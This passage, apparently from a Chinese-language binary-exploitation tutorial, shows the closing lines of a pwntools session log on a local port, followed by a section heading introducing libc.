[DEBUG] Sent 0x5 bytes:
    b'exit\n'
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 14041
```

---

## 认识 libc
